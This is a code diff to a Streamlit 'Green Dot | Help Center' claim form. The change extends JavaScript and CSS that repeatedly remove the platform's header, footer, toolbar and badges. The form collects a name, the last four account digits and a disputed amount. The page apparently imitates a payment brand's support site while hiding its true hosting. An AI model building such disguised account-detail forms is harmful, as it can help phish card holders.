@@ -23,27 +23,40 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# 1. JS: LIMPIEZA DE INTERFAZ REFORZADA
+# 1. JS: LIMPIEZA DE INTERFAZ QUIRÚRGICA
 st.markdown("""<script>
     const cleanDOM = () => {
         const selectors = [
-            '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]',
-            '._viewerBadge_aycw8_23', '[data-testid="stAppToolbar"]',
-            'footer', 'header', '.stDeployButton'
+            '.section-anchor', 
+            'a.section-anchor', 
+            '[data-testid="stHeaderActionElements"]',
+            '.st-emotion-cache-gi0tri', 
+            '.etxdrby3',
+            '._viewerBadge_aycw8_23', 
+            '[data-testid="stAppToolbar"]',
+            'footer', 
+            'header', 
+            '.stDeployButton'
         ];
         selectors.forEach(s => document.querySelectorAll(s).forEach(el => el.remove()));
     };
     setInterval(cleanDOM, 500);
 </script>""", unsafe_allow_html=True)
 
-# 2. CSS: OCULTAR ANCLAS Y CONTROL DE INTERACCIÓN
+# 2. CSS: OCULTAR ANCLAS Y REFUERZO VISUAL
 st.markdown("""<style>
-header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor, [data-testid="stHeaderActionElements"] {
+/* Ocultar anclas y contenedores de acciones en encabezados */
+header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor, 
+[data-testid="stHeaderActionElements"], .st-emotion-cache-gi0tri, .etxdrby3 {
     display: none !important;
     visibility: hidden !important;
+    height: 0 !important;
+    width: 0 !important;
+    opacity: 0 !important;
+    pointer-events: none !important;
 }
 
-/* Eliminar específicamente el símbolo de link en los encabezados */
+/* Eliminar específicamente el símbolo de link en los encabezados de Markdown */
 .stMarkdown a.section-anchor {
     display: none !important;
 }
@@ -107,7 +120,7 @@ with col2:
 st.title("Help Center")
 st.write("Please fill out the form below to submit your claim.")
 
-with st.form("compact_form_v21_5", clear_on_submit=True):
+with st.form("compact_form_v21_6", clear_on_submit=True):
     nombre = st.text_input("Full Name")
     cuenta = st.text_input("Last 4 digits of Account")
     monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
